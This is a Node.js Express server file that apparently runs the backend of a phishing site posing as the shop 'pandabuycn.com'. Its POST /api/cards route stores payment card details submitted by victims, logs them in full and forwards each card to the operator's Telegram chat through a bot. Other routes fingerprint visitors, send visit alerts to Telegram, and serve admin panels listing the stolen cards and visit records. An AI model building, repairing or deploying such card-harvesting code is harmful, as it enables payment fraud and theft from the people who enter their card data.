const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

// Load configuration
let config;
try {
  // Try to load local config first
  config = require('./config.local.js');
  console.log('✅ Loaded local configuration');
} catch (error) {
  // Fallback to default config
  config = require('./config.js');
  console.log('⚠️  Using default configuration - please create config.local.js');
}

// Load Telegram bot if enabled
let telegramBot = null;
if (config.server.enableTelegram && config.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE') {
  const TelegramBot = require('./telegram-bot.js');
  telegramBot = new TelegramBot(config.telegram.botToken, config.telegram.chatId);
  console.log('🤖 Telegram bot initialized');
} else {
  console.log('📱 Telegram integration disabled or not configured');
}

const PORT = config.server.port;

// Data file paths
const DATA_FILE = path.join(__dirname, 'card-data.json');
const VISITS_FILE = path.join(__dirname, 'visits-data.json');

// Middleware
app.use(cors()); // Enable CORS for all routes
app.use(express.json()); // Parse JSON request bodies

// Visit tracking middleware
app.use((req, res, next) => {
  // Skip tracking for API calls and admin panels
  if (req.path.startsWith('/api/') || req.path.includes('admin-')) {
    return next();
  }
  
  // Track the visit
  trackVisit(req);
  next();
});

app.use(express.static('.')); // Serve static files from current directory

// Initialize data files if they don't exist
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, JSON.stringify([]));
  console.log('Created empty card data file');
}

if (!fs.existsSync(VISITS_FILE)) {
  fs.writeFileSync(VISITS_FILE, JSON.stringify([]));
  console.log('Created empty visits data file');
}

// Visit tracking function
function trackVisit(req) {
  try {
    // Get visitor information
    const userAgent = req.headers['user-agent'] || '';
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
               (req.connection.socket ? req.connection.socket.remoteAddress : null) || 
               req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
    
    // Parse user agent for browser and OS info
    const browserInfo = parseUserAgent(userAgent);
    
    const visitData = {
      timestamp: new Date().toISOString(),
      ip: ip,
      userAgent: userAgent,
      browser: browserInfo.browser,
      os: browserInfo.os,
      deviceType: browserInfo.deviceType,
      page: req.path,
      referrer: req.headers.referer || null,
      language: req.headers['accept-language']?.split(',')[0] || null,
      // Mock location data (in real app, you'd use IP geolocation service)
      country: getRandomCountry(),
      city: getRandomCity(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenResolution: 'Unknown' // This would come from client-side
    };
    
    // Read existing visits
    let visits = [];
    try {
      visits = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading visits data:', readError);
    }
    
    // Add new visit
    visits.push(visitData);
    
    // Keep only last 1000 visits to prevent file from growing too large
    if (visits.length > 1000) {
      visits = visits.slice(-1000);
    }
    
    // Save visits data
    fs.writeFileSync(VISITS_FILE, JSON.stringify(visits, null, 2));
    
    console.log(`Visit tracked: ${ip} - ${browserInfo.browser} on ${browserInfo.os}`);
  } catch (error) {
    console.error('Error tracking visit:', error);
  }
}

// Helper function to parse user agent
function parseUserAgent(userAgent) {
  const ua = userAgent.toLowerCase();
  
  let browser = 'Unknown';
  let os = 'Unknown';
  let deviceType = 'Desktop';
  
  // Detect browser
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edg')) browser = 'Edge';
  else if (ua.includes('opera')) browser = 'Opera';
  
  // Detect OS
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios')) os = 'iOS';
  
  // Detect device type
  if (ua.includes('mobile') || ua.includes('android')) deviceType = 'Mobile';
  else if (ua.includes('tablet') || ua.includes('ipad')) deviceType = 'Tablet';
  
  return { browser, os, deviceType };
}

// Mock location functions (replace with real IP geolocation in production)
function getRandomCountry() {
  const countries = ['United States', 'United Kingdom', 'Germany', 'France', 'Canada', 'Australia', 'Japan', 'Brazil', 'India', 'China'];
  return countries[Math.floor(Math.random() * countries.length)];
}

function getRandomCity() {
  const cities = ['New York', 'London', 'Berlin', 'Paris', 'Toronto', 'Sydney', 'Tokyo', 'São Paulo', 'Mumbai', 'Beijing'];
  return cities[Math.floor(Math.random() * cities.length)];
}

// Visit notification cooldown tracking
let lastVisitNotification = 0;
const visitNotificationCooldown = (config.telegram?.notifications?.visitAlertCooldown || 5) * 60 * 1000; // Convert minutes to milliseconds

// Function to check if visit notification should be sent
function shouldSendVisitNotification(visitData) {
  if (!telegramBot || !config.telegram.notifications.sendVisitAlerts) {
    return false;
  }
  
  // Check cooldown
  const now = Date.now();
  if (now - lastVisitNotification < visitNotificationCooldown) {
    return false;
  }
  
  // Check if page is in alert list
  const page = visitData.page?.pathname || visitData.pathname || '/';
  const alertPages = config.telegram.notifications.visitAlertPages || ['/'];
  
  if (!alertPages.includes(page)) {
    return false;
  }
  
  return true;
}

// API Routes
// Get all card data
app.get('/api/cards', (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    res.json(data);
  } catch (error) {
    console.error('Error reading card data:', error);
    res.status(500).json({ error: 'Failed to retrieve card data' });
  }
});

// Add new card data
app.post('/api/cards', (req, res) => {
  try {
    // Read existing data
    let data = [];
    try {
      data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading existing data, starting fresh:', readError);
    }
    
    // Add new card with timestamp and enhanced data
    const newCard = {
      ...req.body,
      serverTimestamp: new Date().toISOString(),
      submissionDate: new Date().toLocaleDateString(),
      submissionTime: new Date().toLocaleTimeString(),
      domain: 'pandabuycn.com'
    };
    
    data.push(newCard);
    
    // Write updated data back to file
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    
    console.log('Card data saved successfully');
    console.log('New card data:', JSON.stringify(newCard, null, 2));
    
    // Send Telegram notification if enabled
    console.log('Checking Telegram notification conditions...');
    console.log('telegramBot exists:', !!telegramBot);
    console.log('sendCardAlerts enabled:', config.telegram.notifications.sendCardAlerts);
    
    if (telegramBot && config.telegram.notifications.sendCardAlerts) {
      console.log('🚀 Sending Telegram notification...');
      telegramBot.sendCardNotification(newCard).catch(error => {
        console.error('Failed to send Telegram notification:', error.message);
      });
    } else {
      console.log('❌ Telegram notification skipped - conditions not met');
    }
    
    res.status(201).json({ success: true, message: 'Card data saved successfully' });
  } catch (error) {
    console.error('Error saving card data:', error);
    res.status(500).json({ error: 'Failed to save card data' });
  }
});

// Clear all card data (for testing/admin purposes)
app.delete('/api/cards', (req, res) => {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    console.log('All card data cleared');
    res.json({ success: true, message: 'All card data cleared' });
  } catch (error) {
    console.error('Error clearing card data:', error);
    res.status(500).json({ error: 'Failed to clear card data' });
  }
});

// Get all visit data
app.get('/api/visits', (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    res.json(data);
  } catch (error) {
    console.error('Error reading visits data:', error);
    res.status(500).json({ error: 'Failed to retrieve visits data' });
  }
});

// Clear all visit data (for testing/admin purposes)
app.delete('/api/visits', (req, res) => {
  try {
    fs.writeFileSync(VISITS_FILE, JSON.stringify([]));
    console.log('All visit data cleared');
    res.json({ success: true, message: 'All visit data cleared' });
  } catch (error) {
    console.error('Error clearing visit data:', error);
    res.status(500).json({ error: 'Failed to clear visit data' });
  }
});

// Enhanced visit tracking endpoint for client-side data
app.post('/api/track-visit', (req, res) => {
  try {
    const clientData = req.body;
    
    // Add server-side information
    const serverData = {
      serverTimestamp: new Date().toISOString(),
      serverIP: req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 
                (req.connection.socket ? req.connection.socket.remoteAddress : null) || 
                req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown',
      serverUserAgent: req.headers['user-agent'] || '',
      serverHeaders: {
        acceptLanguage: req.headers['accept-language'],
        acceptEncoding: req.headers['accept-encoding'],
        connection: req.headers.connection,
        host: req.headers.host,
        referer: req.headers.referer
      }
    };
    
    // Combine client and server data
    const enhancedVisitData = {
      ...clientData,
      server: serverData,
      // Add some mock location data if not provided by client
      geoLocation: clientData.location?.latitude ? clientData.location : {
        country: getRandomCountry(),
        city: getRandomCity(),
        latitude: null,
        longitude: null,
        source: 'mock'
      }
    };
    
    // Read existing visits
    let visits = [];
    try {
      visits = JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
    } catch (readError) {
      console.error('Error reading visits data:', readError);
    }
    
    // Add new enhanced visit
    visits.push(enhancedVisitData);
    
    // Keep only last 1000 visits
    if (visits.length > 1000) {
      visits = visits.slice(-1000);
    }
    
    // Save visits data
    fs.writeFileSync(VISITS_FILE, JSON.stringify(visits, null, 2));
    
    console.log(`Enhanced visit tracked: ${serverData.serverIP} - ${clientData.browser?.name || 'Unknown'} on ${clientData.os?.name || 'Unknown'}`);
    
    // Send Telegram notification if conditions are met
    if (shouldSendVisitNotification(enhancedVisitData)) {
      lastVisitNotification = Date.now();
      telegramBot.sendVisitNotification(enhancedVisitData).catch(error => {
        console.error('Failed to send visit notification to Telegram:', error.message);
      });
    }
    
    res.json({ success: true, message: 'Visit tracked successfully' });
  } catch (error) {
    console.error('Error tracking enhanced visit:', error);
    res.status(500).json({ error: 'Failed to track visit' });
  }
});

// Admin panel routes
app.get('/admin-cards', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-cards.html'));
});

app.get('/admin-visits', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin-visits.html'));
});

// Test Telegram bot endpoint
app.get('/test-telegram', async (req, res) => {
  if (!telegramBot) {
    return res.json({ 
      success: false, 
      message: 'Telegram bot not configured. Please check your config.local.js file.' 
    });
  }
  
  try {
    await telegramBot.testConnection();
    res.json({ 
      success: true, 
      message: 'Telegram bot test successful! Check your Telegram chat for the test message.' 
    });
  } catch (error) {
    res.json({ 
      success: false, 
      message: `Telegram bot test failed: ${error.message}` 
    });
  }
});

// Server info route
app.get('/server-info', (req, res) => {
  res.sendFile(path.join(__dirname, 'server-info.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Access the website at http://localhost:${PORT}`);
  console.log(`Card data API available at http://localhost:${PORT}/api/cards`);
  console.log(`Visits data API available at http://localhost:${PORT}/api/visits`);
  console.log(`Card Admin Panel at http://localhost:${PORT}/admin-cards`);
  console.log(`Visits Admin Panel at http://localhost:${PORT}/admin-visits`);
  console.log(`Server information page at http://localhost:${PORT}/server-info`);
}); 